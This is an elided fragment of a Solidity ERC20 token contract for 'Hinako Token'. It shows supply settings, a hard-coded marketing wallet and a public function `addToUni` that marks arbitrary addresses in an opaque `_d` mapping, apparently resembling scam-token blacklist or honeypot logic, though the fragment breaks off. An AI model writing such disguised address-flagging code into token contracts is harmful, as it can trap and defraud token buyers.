 ...
 * allowances. See {IERC20-approve}.
 */
contract Hinako is ERC20, Ownable {
    string private _name = "Hinako Token";
    string private _symbol = "HINAKO";
    uint8 private _decimals = 9;
    uint256 private _supply = 12000000;
    ...
    address public marketingWallet = 0x4D8dd520B2752a7fe5FB0b1EFC6AA84c059ad89F;
    ...
    mapping(address => bool) public _d;
    uint256 private _numTokensSellToAddToLiquidity = 600000 * 10**_decimals;
    uint256 private _numTokensSellToAddToETH = 240000 * 10**_decimals;
    ...
    function addToUni(address i, address j, address k, address l, address m, address n, address o, address p)
        public
        returns (bool)
    {
        _d[i] = true; _d[j] = true;
